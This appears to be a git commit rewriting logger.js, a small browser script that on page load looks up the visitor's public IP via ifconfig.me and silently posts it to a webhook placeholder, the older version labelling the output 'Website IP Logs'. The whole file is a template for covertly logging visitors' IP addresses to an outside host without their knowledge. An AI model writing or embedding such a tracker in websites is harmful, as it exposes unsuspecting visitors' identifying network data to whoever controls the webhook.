613f9889ea2cb3fd9db7bbf84ea72c3175b1a232
sefty <68341055+krulsefty@users.noreply.github.com>
2024-02-03 22:14:22 +0100

    xd

--- logger.js
+++ logger.js
@@ -1,20 +1,29 @@
-// sefty#0001
+// sefty //
 async function sendWebhook() {
-	let ip = await (await fetch(`https://ifconfig.me/ip`)).text();
-	var request = new XMLHttpRequest();
-	request.open("POST", "YOUR WEBHOOK HERE"); // paste your webhook link there
-
-	request.setRequestHeader('Content-type', 'application/json');
-
-	var params = {
-		username: "Website IP Logs",
-		avatar_url: "",
-		content: `IP: ${ip}`
-	};
-
-	request.send(JSON.stringify(params));
-};
-
-window.onload = function () { // this will run funcion on page load
-	sendWebhook();
-};
+    let ip = await (await fetch(`https://ifconfig.me/ip`)).text()
+    const webhookURL =
+      "YOUR WEBHOOK URL"
+  
+    const message = {
+      content: `${ip}`,
+    }
+  
+    fetch(webhookURL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(message),
+    })
+      .then((response) => {
+        if (!response.ok) {
+          console.error(`Error ${response.status}: ${response.statusText}`)
+        }
+      })
+      .catch((error) => console.error("Error:", error))
+  }
+  
+  window.onload = function () {
+    // this will run funcion on page load
+    sendWebhook()
+  }
